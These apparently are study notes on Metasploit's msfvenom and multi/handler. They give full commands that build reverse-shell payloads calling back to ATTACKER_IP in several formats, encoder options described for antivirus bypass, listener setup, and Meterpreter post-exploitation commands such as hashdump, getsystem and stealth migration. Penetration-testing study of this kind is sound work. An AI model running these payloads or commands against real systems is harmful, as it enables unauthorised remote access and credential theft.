# Shell Notes — Msfvenom & Metasploit Multi/Handler

---

## Msfvenom

Msfvenom is the payload generation tool of the Metasploit Framework. It is the combination of the older `msfpayload` and `msfencode` tools. Its primary function is to generate malicious code (payloads) to be executed on the target system.

### Basic Syntax

```bash
msfvenom -p [PAYLOAD] [OPTIONS] -f [FORMAT] -o [FILE]
```

| Parameter | Description |
|---|---|
| `-p` | Select payload |
| `LHOST` | Attacker's IP (for reverse shell) |
| `LPORT` | Port to listen on |
| `-f` | Output format (exe, elf, php, python...) |
| `-o` | Output file |
| `-e` | Encoder (for AV bypass) |
| `-i` | Number of encoding iterations |
| `-b` | Bad character list |
| `--list` | List available options |

### Payload Types

**Staged vs Stageless**

| | Stageless | Staged |
|---|---|---|
| Notation | `shell_reverse_tcp` | `shell/reverse_tcp` |
| How it works | All code in a single file | Small stager downloads the main payload later |
| Size | Large | Small |
| Requirement | A listener is sufficient | Requires Metasploit multi/handler |
| Use case | Simple scenarios | Size-constrained environments, advanced post-exploitation |

Pay attention to the slash count: `shell_reverse_tcp` = stageless, `shell/reverse_tcp` = staged.

**Payload Name Format**

```
[platform]/[architecture]/[payload_type]

Examples:
windows/x64/shell_reverse_tcp      → stageless
windows/x64/shell/reverse_tcp      → staged
linux/x86/meterpreter_reverse_tcp  → stageless meterpreter
```

### Common Usage Examples

**Windows EXE — Stageless Reverse Shell**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe
```

**Linux ELF — Stageless Reverse Shell**
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```

**PHP Reverse Shell**
```bash
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php
```

**ASP/ASPX (Windows web server)**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx
```

**Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.py
```

### Listing Payloads

```bash
msfvenom --list payloads
msfvenom --list payloads | grep "linux"
msfvenom --list payloads | grep "windows.*reverse"
msfvenom --list formats
```

### Starting a Listener

**Netcat is sufficient for stageless:**
```bash
nc -lvnp 4444
```

**Staged payloads require Metasploit multi/handler:**
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/shell/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run
```

### Meterpreter vs Shell Payload

| | Shell | Meterpreter |
|---|---|---|
| Structure | Standard system shell | Advanced in-memory agent |
| Written to disk | Yes | No (memory-only) |
| Commands | OS commands | Custom meterpreter commands + OS |
| Post-exploitation | Limited | Powerful (hashdump, migrate, getsystem...) |
| Stability | Low | High |
| AV detection | Easy | Harder (but still detectable) |

---

## Metasploit Multi/Handler

Multi/handler is the Metasploit module used to listen for incoming connections. Think of it as the Metasploit version of a Netcat listener — but far more powerful.

Netcat is sufficient for stageless shells, but multi/handler is required in the following cases:
- When using a staged payload
- When using a Meterpreter payload
- When planning to use post-exploitation modules

### Basic Usage

```bash
msfconsole
use exploit/multi/handler

set payload windows/x64/shell_reverse_tcp   # must match what was used in msfvenom
set LHOST ATTACKER_IP
set LPORT 4444

run
```

**Critical rule:** The payload selected with `set payload` must exactly match the one used in msfvenom. A mismatch will either prevent the connection from being established or result in a broken shell.

### Running in the Background

```bash
run -j          # send listener to background
jobs            # view active jobs
sessions        # list sessions
sessions -i [ID]  # connect to a session
```

### Meterpreter Session Commands

```bash
# Basic info
sysinfo
getuid
getpid

# Filesystem
ls
cd /tmp
upload /local/file /remote/path
download /remote/file /local/path

# Privilege escalation
getsystem        # attempt to gain SYSTEM privileges
hashdump         # retrieve hashes from the SAM database

# Process
ps
migrate [PID]    # migrate to another process (stability + stealth)

# Network
ipconfig
arp
route

# Background
background
```

### Shell ↔ Meterpreter Switching

```bash
# From Meterpreter to a normal shell
shell

# Upgrade a normal shell to Meterpreter
sessions -u [ID]
```

### Netcat vs Multi/Handler

| | Netcat | Multi/Handler |
|---|---|---|
| Staged payload | Does not work | Works |
| Meterpreter | Does not work | Works |
| Post-exploitation | None | Full support |
| Multiple simultaneous sessions | No | Yes |
| Setup requirement | None | Requires Metasploit |
